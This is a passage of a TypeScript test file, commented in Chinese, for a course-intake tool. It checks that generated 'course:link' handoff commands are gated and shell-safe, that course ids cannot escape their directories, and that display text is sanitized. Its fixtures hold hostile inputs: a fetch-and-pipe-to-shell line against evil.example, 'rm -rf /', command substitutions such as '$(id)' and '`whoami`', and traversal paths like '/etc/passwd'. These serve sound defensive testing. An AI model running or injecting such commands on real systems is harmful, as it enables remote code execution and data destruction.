      expect(gate.status).not.toBe("PROMOTABLE");
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// F11 —— 链接交接命令必须是 shell 安全的
// ===========================================================================

describe("F11 —— 交接命令 shell 安全（自由文本绝不进入命令）", () => {
  const MALICIOUS = [
    'proof "quoted"; $(echo bad); `bad`; $HOME',
    "line one\nline two\nline three",
    "a; rm -rf /; b",
    "back\\slash and 'single' and \"double\"",
    "$(curl http://evil.example/x) | sh",
    "…中文与 emoji 😀 混排 —— 引号 ` 反引号 $ 分号 ; 换行",
  ];

  it("恶意/尴尬的复核依据**不得**出现在生成的命令里", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f11-a", readingFixture(), true);
      const stored = readStoredCandidate("f11-a", env.candidatesDir);
      const withSuggestion = stored.metadata.matching.segments.find((segment) => segment.suggestions.length > 0);
      expect(withSuggestion).toBeDefined();
      const top = withSuggestion!.suggestions[0];

      for (const evidence of MALICIOUS) {
        const review = acceptAllReview(stored, {
          matches: [
            acceptedMatchEntry(withSuggestion!.segmentId, top.target, evidence),
          ],
        });
        const parsed = validateCourseReviewFile(review);
        expect(parsed.ok).toBe(true);

        // F12：交接计划绑定门禁 —— 必须用**真实的** PROMOTABLE 门禁放行
        const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
        expect(gate.status).toBe("PROMOTABLE");

        const plan = buildLinkPlan({ stored, review: parsed.file, gate });
        expect(plan.entries).toHaveLength(1);
        const command = plan.entries[0].command;

        // 命令里**不得**出现任何自由文本片段
        expect(command).not.toContain("echo bad");
        expect(command).not.toContain("$HOME");
        expect(command).not.toContain("`bad`");
        expect(command).not.toContain("rm -rf");
        expect(command).not.toContain("curl");
        expect(command).not.toContain("evil.example");
        expect(command).not.toContain("\n");
        expect(command).not.toContain("😀");
        // 也不得出现引号（ref 是受控标识符，不需要引号）
        expect(command).not.toContain('"');
        expect(command).not.toContain("'");

        // 命令只由安全字符集与固定标志组成
        expect(command).toMatch(/^[A-Za-z0-9 ._:\-<>|/]+$/);
        // 但人写的证据**必须**仍然可在 plan 里读到（没被丢掉，只是不进军令）
        expect(plan.entries[0].reviewEvidence).toBe(evidence);
      }
    } finally {
      env.dispose();
    }
  });

  it("ref 是确定性且安全的受控标识符", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f11-b", readingFixture(), true);
      const stored = readStoredCandidate("f11-b", env.candidatesDir);
      const withSuggestion = stored.metadata.matching.segments.find((segment) => segment.suggestions.length > 0)!;
      const top = withSuggestion.suggestions[0];
      const evil = 'x"; $(id); `whoami`; \n $HOME';

      const review = acceptAllReview(stored, {
        matches: [
          acceptedMatchEntry(withSuggestion.segmentId, top.target, evil),
        ],
      });
      const parsed = validateCourseReviewFile(review);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);

      const plan1 = buildLinkPlan({ stored, review: parsed.file, gate });
      const plan2 = buildLinkPlan({ stored, review: parsed.file, gate });
      // 确定性
      expect(plan1.entries[0].ref).toBe(plan2.entries[0].ref);
      // 安全字符集
      expect(plan1.entries[0].ref).toMatch(/^[a-z0-9._:-]+$/);
      expect(plan1.entries[0].ref).toMatch(/^course-review:/);
      // 命令里用的就是它
      expect(plan1.entries[0].command).toContain(`--ref ${plan1.entries[0].ref}`);
    } finally {
      env.dispose();
    }
  });

  it("命令仍然**不带** --commit，且没有任何东西被自动执行", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f11-c", readingFixture(), true);
      const stored = readStoredCandidate("f11-c", env.candidatesDir);
      const withSuggestion = stored.metadata.matching.segments.find((segment) => segment.suggestions.length > 0)!;
      const top = withSuggestion.suggestions[0];

      const review = acceptAllReview(stored, {
        matches: [
          acceptedMatchEntry(withSuggestion.segmentId, top.target, "测试夹具：接受该建议用于验证交接命令（≥10 字符）。"),
        ],
      });
      const parsed = validateCourseReviewFile(review);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      const plan = buildLinkPlan({ stored, review: parsed.file, gate });

      for (const entry of plan.entries) {
        expect(entry.command).not.toContain("--commit");
        expect(entry.command).toContain("--status verified");
      }
      // 交接计划**不写任何运行时真相**：courses/ 与链接表都不受影响
      expect(existsSync(join(env.coursesDir, "f11-c"))).toBe(false);
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// canonical 库不完整时的语义（定向问题）
// ===========================================================================

describe("canonical 库不完整的语义（课程包可晋升，但接受建议失败关闭）", () => {
  it("一份真题包读不出来 ⇒ 库摘要变化（readFailures 参与身份）", async () => {
    const env = makeEnv();
    try {
      writeFixturePackage(env.contentRoot, "p-ok", buildFixturePackage({ id: "p-ok", contentVersion: 1 }));
      const complete = buildIndexFromDisk(env.papersDir);
      expect(complete.index.summary.readFailures).toEqual([]);

      // 放一份**坏**的真题包（有 paper.json 但内容非法）
      const brokenDir = join(env.papersDir, "p-broken");
      mkdirSync(brokenDir, { recursive: true });
      writeFileSync(join(brokenDir, "paper.json"), "{ not valid json", "utf8");

      const incomplete = buildIndexFromDisk(env.papersDir);
      expect(incomplete.failures.length).toBe(1);
      expect(incomplete.index.summary.readFailures.length).toBe(1);
      // **摘要必须变** —— 否则"库从不完整变完整"对复核不可见
      expect(incomplete.index.summary.digest).not.toBe(complete.index.summary.digest);
    } finally {
      env.dispose();
    }
  });

  it("库不完整 ⇒ 没有接受建议时**不阻断课程包晋升**（未匹配是合法状态）", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "lib-a", readingFixture());
      // 库不完整 + **没有** accepted_suggestion ⇒ 该项通过
      const { gate } = setupGate(env, "lib-a", readingFixture(), {}, { complete: false });
      const check = gate.checks.find((c) => c.name === "canonical_library_complete_for_acceptance");
      expect(check?.passed).toBe(true);
      expect(check?.detail).toMatch(/没有接受任何 canonical 建议/);
    } finally {
      env.dispose();
    }
  });

  it("库不完整 + 有 accepted_suggestion ⇒ **BLOCKED**（不得当作可信建链依据）", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "lib-b", readingFixture(), true);
      const stored = readStoredCandidate("lib-b", env.candidatesDir);
      const withSuggestion = stored.metadata.matching.segments.find((segment) => segment.suggestions.length > 0);
      if (!withSuggestion) return; // 夹具未产生建议 ⇒ 本用例不适用
      const top = withSuggestion.suggestions[0];

      const { gate } = setupGate(
        env,
        "lib-b",
        readingFixture(),
        {
          matches: [
            acceptedMatchEntry(withSuggestion.segmentId, top.target, "测试夹具：接受建议以验证库不完整时的失败关闭（≥10 字符）。"),
          ],
        },
        { complete: false },
      );

      expect(gate.status).toBe("BLOCKED");
      const check = gate.checks.find((c) => c.name === "canonical_library_complete_for_acceptance");
      expect(check?.passed).toBe(false);
      // 必须同时说明"这不阻断课程包晋升"
      expect(check?.detail).toMatch(/不\*\*阻断课程包晋升|未匹配是合法状态/);
      expect(check?.detail).toMatch(/不可信|不得据此交接/);
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// F12 —— 链接交接计划必须**绑定门禁**（非 PROMOTABLE 时零命令）
// ===========================================================================

/**
 * 交接计划的对抗性测试。
 *
 * ── F12 的根因 ──
 *
 * `buildLinkPlan` 早先只读 `review.matches`，因此**看不见**任何门禁状态：
 * 候选校验和是否陈旧、源是否漂移、canonical 库是否完整、是否存在被否决的
 * 分组或段。于是 CLI 可以一边打印"库不完整，不得据此交接建链"，
 * 一边照样输出 `pnpm course:link ... --status verified`。
 *
 * 省略 `--commit` 只降低**立即写入**的风险，**不满足产品契约**。
 *
 * `buildLinkPlan` 现在是**信任边界函数**：`gate` 是必需参数，非 PROMOTABLE 直接空集。
 */
describe("F12 —— 交接计划绑定门禁（非 PROMOTABLE ⇒ 零命令）", () => {
  /**
   * 构造一份"接受最高分建议"的 matches。
   *
   * 粒度**照抄** suggestion 的 target（见 `acceptedMatchEntry` 的说明）——
   * 否则门禁会（正确地）判"该组合不在候选建议里"。
   */
  function acceptedMatchesFor(
    stored: ReturnType<typeof readStoredCandidate>,
    evidence = "测试夹具：接受机器提出过的该建议（≥10 字符）。",
  ) {
    const withSuggestion = stored.metadata.matching.segments.find((s) => s.suggestions.length > 0);
    if (!withSuggestion) return null;
    const top = withSuggestion.suggestions[0];
    return {
      segmentId: withSuggestion.segmentId,
      entry: acceptedMatchEntry(withSuggestion.segmentId, top.target, evidence),
    };
  }

  it("1) 有效当期复核 + PROMOTABLE + accepted_suggestion ⇒ 恰好一条 dry-run 命令，无 --commit", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-1", readingFixture(), true);
      const stored = readStoredCandidate("f12-1", env.candidatesDir);
      const accepted = acceptedMatchesFor(stored)!;

      const { gate, raw } = setupGate(env, "f12-1", readingFixture(), { matches: [accepted.entry] });
      expect(gate.status).toBe("PROMOTABLE");
      const parsed = validateCourseReviewFile(raw);

      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.allowed).toBe(true);
      expect(plan.entries).toHaveLength(1);
      const command = plan.entries[0].command;
      expect(command).toContain("pnpm course:link");
      expect(command).toContain("--status verified");
      expect(command).toContain(`--segment ${accepted.segmentId}`);
      expect(command).not.toContain("--commit");
      // ref 是受控标识符，不是自由文本
      expect(plan.entries[0].ref).toMatch(/^course-review:[a-z0-9._:-]+$/);
      expect(command).toContain(`--ref ${plan.entries[0].ref}`);
    } finally {
      env.dispose();
    }
  });

  it("2) 陈旧 candidateChecksum + accepted_suggestion ⇒ 零交接", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-2", readingFixture(), true);
      const stored = readStoredCandidate("f12-2", env.candidatesDir);
      const accepted = acceptedMatchesFor(stored)!;
      const raw = acceptAllReview(stored, {
        candidateChecksum: "0".repeat(64),
        matches: [accepted.entry],
      });
      writeFileSync(join(env.candidatesDir, "f12-2", "review.json"), JSON.stringify(raw, null, 2), "utf8");
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);

      expect(gate.status).not.toBe("PROMOTABLE");
      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.allowed).toBe(false);
      expect(plan.entries).toEqual([]);
      expect(plan.reason).toMatch(/不是 PROMOTABLE|抑制/);
    } finally {
      env.dispose();
    }
  });

  it("3) 源漂移（不重跑抽取）+ accepted_suggestion ⇒ BLOCKED + 零交接", async () => {
    const env = makeEnv();
    try {
      const { sourceRoot } = await prepareCandidate(env, "f12-3", readingFixture(), true);
      const stored = readStoredCandidate("f12-3", env.candidatesDir);
      const accepted = acceptedMatchesFor(stored)!;

      // 改动源字节，**不重跑** course:extract
      writeFileSync(join(sourceRoot, "阅读", "reading-handout.pdf"), buildTextPdf([["Drifted source content."]]));

      const { gate, raw } = setupGate(env, "f12-3", readingFixture(), { matches: [accepted.entry] });
      expect(gate.status).not.toBe("PROMOTABLE");
      expect(gate.checks.find((c) => c.name === "source_current_and_unchanged")?.passed).toBe(false);

      // 关键在于 gate 本身（而不是"没有 review"）挡住了交接
      const parsed = validateCourseReviewFile(raw);
      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.allowed).toBe(false);
      expect(plan.entries).toEqual([]);
      expect(plan.reason).toMatch(/不是 PROMOTABLE|抑制/);
    } finally {
      env.dispose();
    }
  });

  it("4) 源不可用（目录被删除）+ accepted_suggestion ⇒ 零交接", async () => {
    const env = makeEnv();
    try {
      const { sourceRoot } = await prepareCandidate(env, "f12-4", readingFixture(), true);
      const stored = readStoredCandidate("f12-4", env.candidatesDir);
      const accepted = acceptedMatchesFor(stored)!;
      rmSync(sourceRoot, { recursive: true, force: true });

      const { gate, raw } = setupGate(env, "f12-4", readingFixture(), { matches: [accepted.entry] });
      expect(gate.status).not.toBe("PROMOTABLE");
      expect(gate.checks.find((c) => c.name === "source_current_and_unchanged")?.passed).toBe(false);

      const parsed = validateCourseReviewFile(raw);
      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.allowed).toBe(false);
      expect(plan.entries).toEqual([]);
    } finally {
      env.dispose();
    }
  });

  it("5) canonical 库不完整 + accepted_suggestion ⇒ 该项失败 + 零交接（收口实现/文档矛盾）", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-5", readingFixture(), true);
      const stored = readStoredCandidate("f12-5", env.candidatesDir);
      const accepted = acceptedMatchesFor(stored)!;

      const raw = acceptAllReview(stored, { matches: [accepted.entry] });
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(
        env,
        stored,
        parsed.file,
        parsed.errors,
        stored.metadata.matching.canonicalLibrary.digest,
        { complete: false },
      );

      expect(gate.checks.find((c) => c.name === "canonical_library_complete_for_acceptance")?.passed).toBe(false);
      expect(gate.status).not.toBe("PROMOTABLE");

      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.entries).toEqual([]);
      // CLI 会说"不得据此交接建链"，因此这里**必须**真的没有命令
      expect(plan.allowed).toBe(false);
    } finally {
      env.dispose();
    }
  });

  it("6) rejected 分组 + accepted_suggestion ⇒ 零交接", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-6", pdfPlusDocxFixture(), true);
      const stored = readStoredCandidate("f12-6", env.candidatesDir);
      const accepted = acceptedMatchesFor(stored);
      const target = stored.metadata.grouping.proposals.find((p) => p.reviewRequired);
      expect(target).toBeDefined();

      const raw = acceptAllReview(stored, {
        materialGroupings: stored.metadata.grouping.proposals
          .filter((p) => p.reviewRequired)
          .map((p) => ({
            proposalId: p.id,
            decision: p.id === target!.id ? "rejected" : "accepted",
            note: "n",
            evidence: "测试夹具：该分组是错的（≥10 字符）。",
          })),
        ...(accepted ? { matches: [accepted.entry] } : {}),
      });
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      expect(gate.status).toBe("BLOCKED");

      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.entries).toEqual([]);
    } finally {
      env.dispose();
    }
  });

  it("7) excluded 段 + accepted_suggestion ⇒ 零交接", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-7", readingFixture(), true);
      const stored = readStoredCandidate("f12-7", env.candidatesDir);
      const accepted = acceptedMatchesFor(stored)!;
      const target = stored.metadata.segmentation.materials
        .flatMap((m) => m.segments)
        .find((s) => s.reviewRequired);
      expect(target).toBeDefined();

      const raw = acceptAllReview(stored, {
        segments: stored.metadata.segmentation.materials
          .flatMap((m) => m.segments)
          .filter((s) => s.reviewRequired)
          .map((s) => ({
            segmentId: s.id,
            decision: s.id === target!.id ? "excluded" : "accepted",
            note: "n",
            evidence: "测试夹具：该段应被排除（≥10 字符）。",
          })),
        matches: [accepted.entry],
      });
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      expect(gate.status).toBe("BLOCKED");

      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.entries).toEqual([]);
    } finally {
      env.dispose();
    }
  });

  it("8) 段复核未裁决（只有匹配裁决）⇒ 零交接（F8 与 F12 交汇）", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-8", readingFixture(), true);
      const stored = readStoredCandidate("f12-8", env.candidatesDir);
      const accepted = acceptedMatchesFor(stored)!;

      // **清空** segments[]，只留匹配裁决
      const raw = acceptAllReview(stored, { segments: [], matches: [accepted.entry] });
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);

      expect(gate.status).not.toBe("PROMOTABLE");
      expect(gate.checks.find((c) => c.name === "blocking_review_items_resolved")?.passed).toBe(false);

      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.entries).toEqual([]);
    } finally {
      env.dispose();
    }
  });

  it("9) 库不完整但**没有** accepted_suggestion ⇒ 课程包仍可 PROMOTABLE，交接为空", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-9", readingFixture(), true);
      const stored = readStoredCandidate("f12-9", env.candidatesDir);

      // 刻意**不**接受任何建议（matches 为空）
      const raw = acceptAllReview(stored, { matches: [] });
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(
        env,
        stored,
        parsed.file,
        parsed.errors,
        stored.metadata.matching.canonicalLibrary.digest,
        { complete: false },
      );

      // 关键：库不完整**不得**变成对课程包晋升的一刀切阻断
      expect(gate.status).toBe("PROMOTABLE");
      expect(gate.checks.find((c) => c.name === "canonical_library_complete_for_acceptance")?.passed).toBe(true);

      const plan = buildLinkPlan({ stored, review: parsed.file, gate });
      expect(plan.allowed).toBe(true);
      expect(plan.entries).toEqual([]);
    } finally {
      env.dispose();
    }
  });

  it("10) F11 回归：恶意 evidence 不进军令，ref 确定且安全，仍无 --commit", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-10", readingFixture(), true);
      const stored = readStoredCandidate("f12-10", env.candidatesDir);
      const malicious = 'proof "quoted"; $(echo bad); `bad`; $HOME\nnewline';
      const accepted = acceptedMatchesFor(stored, malicious)!;

      const raw = acceptAllReview(stored, { matches: [accepted.entry] });
      const parsed = validateCourseReviewFile(raw);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      expect(gate.status).toBe("PROMOTABLE");

      const plan1 = buildLinkPlan({ stored, review: parsed.file, gate });
      const plan2 = buildLinkPlan({ stored, review: parsed.file, gate });

      expect(plan1.entries).toHaveLength(1);
      const command = plan1.entries[0].command;
      expect(command).not.toContain("echo bad");
      expect(command).not.toContain("$HOME");
      expect(command).not.toContain("`bad`");
      expect(command).not.toContain("\n");
      expect(command).not.toContain('"');
      // 确定性 + 安全字符集
      expect(plan1.entries[0].ref).toBe(plan2.entries[0].ref);
      expect(plan1.entries[0].ref).toMatch(/^course-review:[a-z0-9._:-]+$/);
      // 仍无 --commit
      expect(command).not.toContain("--commit");
      // 证据仍可读
      expect(plan1.entries[0].reviewEvidence).toBe(malicious);
    } finally {
      env.dispose();
    }
  });

  it("没有 review ⇒ 零交接（即使门禁 PASS）", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f12-null", readingFixture(), true);
      const stored = readStoredCandidate("f12-null", env.candidatesDir);
      const { gate } = setupGate(env, "f12-null", readingFixture());
      const plan = buildLinkPlan({ stored, review: null, gate });
      expect(plan.allowed).toBe(false);
      expect(plan.entries).toEqual([]);
      expect(plan.reason).toMatch(/没有复核记录/);
    } finally {
      env.dispose();
    }
  });

  it("结构性：buildLinkPlan 的 gate 是**必需**参数（省略即类型错误，无法被绕过）", () => {
    // 这条由 TypeScript 强制：省略 gate 会导致编译失败（见 tests/architecture.test.ts 的门禁）。
    // 运行时再确认一次"非 PROMOTABLE 一定零命令"的不变量。
    const blockedGate = {
      courseId: "x",
      status: "BLOCKED" as const,
      checks: [],
      blocking: [],
      summary: "blocked",
    };
    const plan = buildLinkPlan({
      stored: { courseId: "x", candidateDir: "", metadata: {} as never, metadataRaw: "", courseRaw: "", recomputed: {} as never },
      review: null,
      gate: blockedGate,
    });
    expect(plan.allowed).toBe(false);
    expect(plan.entries).toEqual([]);
  });
});

// ===========================================================================
// 评审项 F-A ~ F-E：路径容纳 / 展示安全 / 摘要语义 / 坏 JSON / 未使用参数
// ===========================================================================

describe("F-B —— 课程 id 路径容纳（CLI 与 service 各自独立拒绝）", () => {
  const ESCAPES = [
    "..",
    "../escape",
    "..\\escape",
    "../../escape",
    "..\\..\\escape",
    "/etc/passwd",
    "/absolute/path",
    "C:\\Windows\\system32",
    "C:/Windows/system32",
    "\\\\server\\share",
    "//server/share",
    "a/b",
    "a\\b",
    "",
    ".",
    "./x",
  ];

  it("isSafeCourseId / assertSafeCourseId 拒绝全部逃逸形态，接受合法 id", () => {
    for (const evil of ESCAPES) {
      expect(isSafeCourseId(evil), `应当拒绝：${JSON.stringify(evil)}`).toBe(false);
      expect(() => assertSafeCourseId(evil), `应当抛错：${JSON.stringify(evil)}`).toThrow();
    }
    for (const good of ["c", "course-a", "rsvp-2026h2-reading", "a.b_c", "x1"]) {
      expect(isSafeCourseId(good), `应当接受：${good}`).toBe(true);
      expect(assertSafeCourseId(good)).toBe(good);
    }
    // `a..b` 是合法**目录名**（不含分隔符 ⇒ 无法上跳）
    expect(isSafeCourseId("a..b")).toBe(true);
  });

  it("readStoredCandidate 直接调用也**无法**逃出候选根（不依赖 CLI 校验）", () => {
    const env = makeEnv();
    try {
      const candidatesRoot = join(env.contentRoot, "course-candidates");
      mkdirSync(candidatesRoot, { recursive: true });

      // 在候选根**之外**放一份"看起来像候选"的目录
      const outside = join(env.contentRoot, "ESCAPE-TARGET");
      mkdirSync(outside, { recursive: true });
      writeFileSync(join(outside, "candidate.json"), "{}", "utf8");
      writeFileSync(join(outside, "course.json"), "{}", "utf8");

      for (const evil of ["../ESCAPE-TARGET", "..\\ESCAPE-TARGET", "../../ESCAPE-TARGET"]) {
        expect(() => readStoredCandidate(evil, candidatesRoot), `必须拒绝：${evil}`).toThrow(
          /课程 id 不安全/,
        );
      }
      expect(() => readStoredCandidate(outside, candidatesRoot)).toThrow(/课程 id 不安全/);
    } finally {
      env.dispose();
    }
  });

  it("resolveCandidateDir / resolvePromotedCourseDir 只返回根内路径", () => {
    const env = makeEnv();
    try {
      const candidatesRoot = join(env.contentRoot, "course-candidates");
      const coursesRoot = join(env.contentRoot, "courses");
      mkdirSync(candidatesRoot, { recursive: true });
      mkdirSync(coursesRoot, { recursive: true });

      const c = resolveCandidateDir("good-id", candidatesRoot);
      expect(isWithin(resolve(candidatesRoot), c)).toBe(true);
      const p = resolvePromotedCourseDir("good-id", coursesRoot);
      expect(isWithin(resolve(coursesRoot), p)).toBe(true);

      for (const evil of ["../escape", "..\\escape", "/abs", "C:\\x", "a/b"]) {
        expect(() => resolveCandidateDir(evil, candidatesRoot), `候选：${evil}`).toThrow();
        expect(() => resolvePromotedCourseDir(evil, coursesRoot), `课程：${evil}`).toThrow();
      }
    } finally {
      env.dispose();
    }
  });

  it("**手工构造**的 StoredCandidate 也不能让晋升写出 courses/ 之外", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f-b-promote", readingFixture());
      const stored = readStoredCandidate("f-b-promote", env.candidatesDir);
      const { gate, parsed } = setupGate(env, "f-b-promote", readingFixture());
      expect(gate.status).toBe("PROMOTABLE");

      // 恶意构造：courseId 逃逸，candidateDir 指向真实候选（内容合法）
      const evilStored = { ...stored, courseId: "../../ESCAPE-PROMOTION" };

      const promoted = promoteCourseCandidate({
        stored: evilStored,
        gate,
        review: parsed.file,
        coursesDir: env.coursesDir,
      });
      expect(promoted.ok).toBe(false);
      expect(promoted.error).toMatch(/课程 id 不安全|courses\/ 之外/);
      // 关键：根之外**没有**被写入任何东西
      expect(existsSync(join(env.contentRoot, "ESCAPE-PROMOTION"))).toBe(false);
      expect(existsSync(join(env.root, "ESCAPE-PROMOTION"))).toBe(false);
    } finally {
      env.dispose();
    }
  });
});

describe("F-C —— 展示文本消毒（不允许伪造命令 / 展开 shell 语法）", () => {
  const NASTY = [
    "odd$(id)dir",
    "back`tick",
    'quote"dir',
    "single'quote",
    "semi;colon",
    "pipe|dir",
    "amp&dir",
    "new\nline",
    "carriage\rreturn",
    "tab\there",
    "with spaces",
    "unicode中文😀",
    "redir>out",
    "less<in",
    "$env:PATH",
  ];

  it("sanitizeForDisplay 中性化控制字符与 shell 元字符", () => {
    for (const nasty of NASTY) {
      const safe = sanitizeForDisplay(nasty);
      expect(safe, `不得含控制字符：${JSON.stringify(nasty)}`).not.toMatch(/[\u0000-\u001f\u007f]/);
      expect(safe, `不得含 $：${nasty}`).not.toContain("$");
      expect(safe, `不得含反引号：${nasty}`).not.toContain("`");
      expect(safe, `不得含分号：${nasty}`).not.toContain(";");
      expect(safe, `不得含管道：${nasty}`).not.toContain("|");
      expect(safe, `不得含 &：${nasty}`).not.toContain("&");
      expect(safe, `不得含引号：${nasty}`).not.toMatch(/["']/);
      // 换行必须变成可见字符，而不是被直接删掉（否则人看不出原本有换行）
      if (nasty.includes("\n")) expect(safe).toContain("?");
    }
    expect(sanitizeForDisplay("x".repeat(500)).length).toBeLessThanOrEqual(81);
  });

  it("恶意外部源目录名不会进入可执行形态的提示", async () => {
    const env = makeEnv();
    try {
      /*
       * 目录名必须是 Windows **可创建**的，因此只能用允许的元字符：
       * `$` `` ` `` `;` `&` `'` 空格都合法；`|` `<` `>` `"` 与控制字符
       * （含换行）在 Windows 上无法作为文件名 —— 那些由上面的
       * `sanitizeForDisplay` 单元用例直接覆盖。
       */
      const evilName = "odd$(id)dir`x`;y&z 'q'";
      const externalRoot = join(env.root, evilName);
      mkdirSync(externalRoot, { recursive: true });
      writeSourceTree(externalRoot, readingFixture());

      const result = await runCourseIntake({
        sourceRoot: externalRoot,
        courseId: "f-c",
        provider: "test_fixture_provider",
        edition: null,
        title: "外部源",
        contentVersion: 1,
        provenance: { note: "n", reference: null, rightsNote: "r" },
        papersDir: env.papersDir,
        standardSourcesRoot: join(env.contentRoot, "course-sources"),
      });

      expect(result.archive.metadata.inventory.sourceLocator.kind).toBe("external");
      const serialized = JSON.stringify(result.archive.metadata);
      /*
       * ── 契约的精确边界 ──
       *
       * 原始目录名**会**作为 `sourceLocator.label` 被持久化 —— 那是**数据**
       * （一个名字），不是命令文本，也不含绝对路径。这没问题。
       *
       * 必须成立的契约是：
       * 1. 候选里**不含绝对路径**（源根之外的任何位置信息都不落盘）；
       * 2. 任何**展示/提示**里都不得出现原始文本（那才是 F-C 的缺陷）。
       */
      expect(serialized, "不得持久化绝对路径").not.toContain(env.root);
      expect(serialized, "不得把外部源目录名当成资产路径").not.toContain("$(id)/");

      // 展示用的 label 必须被消毒（$ / 反引号 / 分号 / & / 引号 全部中性化）
      const label =
        result.archive.metadata.inventory.sourceLocator.kind === "external"
          ? result.archive.metadata.inventory.sourceLocator.label
          : "";
      expect(label, "原始 label 确实含元字符（否则本用例没有意义）").toContain("$(id)");
      const safe = sanitizeForDisplay(label);
      expect(safe).not.toContain("$");
      expect(safe).not.toContain("`");
      expect(safe).not.toContain(";");
      expect(safe).not.toContain("&");
      expect(safe).not.toMatch(/["']/);
      expect(safe).not.toMatch(/[\u0000-\u001f\u007f]/);
    } finally {
      env.dispose();
    }
  });

  it("source-root 提示是**模板**而不是含真实路径的可执行命令（源码级）", () => {
    const source = readFileSync(join(process.cwd(), "scripts/course-extract.ts"), "utf8");
    expect(source, "不得输出带真实路径的 --source-root").not.toMatch(/--source-root "\$\{args\.source\}"/);
    expect(source).toContain("--source-root <PATH>");
    expect(source).toContain("命令模板");
    expect(source).toContain("sanitizeForDisplay(locator.label)");
  });
});

describe("F-A —— 派生子摘要是缓存，身份的权威判据是 candidateChecksum", () => {
  it("只改记录的 matchingDigest（内容没动）⇒ 门禁仍 PROMOTABLE，且说明是缓存过期", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f-a", readingFixture());
      const candidatePath = join(env.candidatesDir, "f-a", "candidate.json");

      const raw = JSON.parse(readFileSync(candidatePath, "utf8"));
      raw.digests.matchingDigest = "f".repeat(64);
      writeFileSync(candidatePath, JSON.stringify(raw, null, 2), "utf8");

      const stored = readStoredCandidate("f-a", env.candidatesDir);
      expect(stored.metadata.digests.matchingDigest).not.toBe(stored.recomputed.matchingDigest);
      // 但**候选校验和仍然自洽**（它由现场重算合成，内容没变）
      expect(stored.metadata.digests.candidateChecksum).toBe(stored.recomputed.candidateChecksum);

      const { gate } = setupGate(env, "f-a", readingFixture());
      const check = gate.checks.find((c) => c.name === "candidate_checksum_self_consistent");
      expect(check?.passed).toBe(true);
      expect(check?.detail).toMatch(/缓存|诊断子摘要/);
      expect(check?.detail).toContain("不构成完整性问题");
      expect(check?.detail).not.toMatch(/内容.*被改动|被改动过/);
      expect(gate.status).toBe("PROMOTABLE");
    } finally {
      env.dispose();
    }
  });

  it("**内容**被改动（course.json 变）⇒ 校验和不符 ⇒ 阻断", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f-a2", readingFixture());
      const coursePath = join(env.candidatesDir, "f-a2", "course.json");
      const manifest = JSON.parse(readFileSync(coursePath, "utf8"));
      manifest.title = "被改过的标题";
      writeFileSync(coursePath, `${JSON.stringify(manifest, null, 2)}\n`, "utf8");

      const stored = readStoredCandidate("f-a2", env.candidatesDir);
      expect(stored.metadata.digests.candidateChecksum).not.toBe(stored.recomputed.candidateChecksum);

      const { gate } = setupGate(env, "f-a2", readingFixture());
      const check = gate.checks.find((c) => c.name === "candidate_checksum_self_consistent");
      expect(check?.passed).toBe(false);
      expect(gate.status).not.toBe("PROMOTABLE");
    } finally {
      env.dispose();
    }
  });
});

describe("F-D —— 坏 JSON 是正常失败状态，不是崩溃", () => {
  it("review.json 被截断 / 语法错误 ⇒ 无效状态、不可晋升、零交接、零晋升", async () => {
    for (const badJson of ['{"courseId": "x", "reviewer":', "not json at all", "{,}", ""]) {
      const env = makeEnv();
      try {
        await prepareCandidate(env, "f-d", readingFixture());
        const dir = join(env.candidatesDir, "f-d");
        writeFileSync(join(dir, "review.json"), badJson, "utf8");

        const stored = readStoredCandidate("f-d", env.candidatesDir);

        let parsedReview: ReturnType<typeof validateCourseReviewFile>;
        try {
          parsedReview = validateCourseReviewFile(JSON.parse(readFileSync(join(dir, "review.json"), "utf8")));
        } catch (error) {
          parsedReview = {
            ok: false,
            file: null,
            errors: [`review.json 不是合法 JSON（解析失败）：${(error as Error).message}`],
          };
        }
